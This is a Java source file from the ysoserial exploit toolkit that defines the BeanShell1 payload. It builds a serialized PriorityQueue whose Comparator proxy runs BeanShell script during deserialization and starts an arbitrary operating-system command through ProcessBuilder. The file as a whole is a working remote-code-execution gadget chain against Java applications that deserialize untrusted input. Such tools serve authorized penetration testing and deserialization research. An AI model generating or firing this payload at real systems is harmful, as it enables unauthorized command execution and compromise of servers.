package ysoserial.payloads;

import bsh.Interpreter;
import bsh.XThis;
import ysoserial.Strings;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * Credits: Alvaro Munoz (@pwntester) and Christian Schneider (@cschneider4711)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.beanshell:bsh:2.0b5"})
@Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(BeanShell1.class, args);
    }

    public PriorityQueue getObject(String command) throws Exception {
        // BeanShell payload

        String payload =
            "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
                Strings.join( // does not support spaces in quotes
                    Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"").split(" ")),
                    ",", "\"", "\"") +
                "}).start();return new Integer(1);}";

        // Create Interpreter
        Interpreter i = new Interpreter();
        // 覆盖bsh.cwd,清空user.dir，防止信息泄露
        Method setu = i.getClass().getDeclaredMethod("setu", new Class[]{String.class, Object.class});
        setu.setAccessible(true);
        setu.invoke(i, new Object[]{"bsh.cwd", "."});
        // Evaluate payload
        i.eval(payload);

        // Create InvocationHandler
        XThis xt = new XThis(i.getNameSpace(), i);
        InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), "invocationHandler").get(xt);

        // Create Comparator Proxy
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        // Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[]{1, 1};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);

        return priorityQueue;
    }
}
